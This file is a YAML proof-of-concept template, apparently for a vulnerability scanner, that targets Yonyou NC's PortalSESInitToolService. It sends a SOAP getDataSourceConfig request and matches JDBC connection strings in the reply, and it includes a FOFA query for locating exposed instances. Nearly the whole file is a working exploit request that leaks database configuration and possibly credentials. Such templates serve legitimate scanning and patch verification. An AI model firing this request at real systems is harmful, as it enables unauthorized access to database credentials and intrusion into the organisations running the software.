id: poc-yaml-yongyou-nc-portalsestnittoolservice-information-leak
info:
  name: 用友NC PortalSESInitToolService 信息泄露
  severity: high
  tags:
  - 信息泄露
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
requests:
- method: POST
  path: /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService
  headers:
    Content-Type: application/xml
  data: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService"><soapenv:Header/><soapenv:Body><por:getDataSourceConfig/></soapenv:Body></soapenv:Envelope>
  expression: 'status_code == 200

    && contains(body,"jdbc")

    && contains(headers,"text/xml")

    && contains(body,"jdbc:oracle")

    '
variables: {}
transport: http
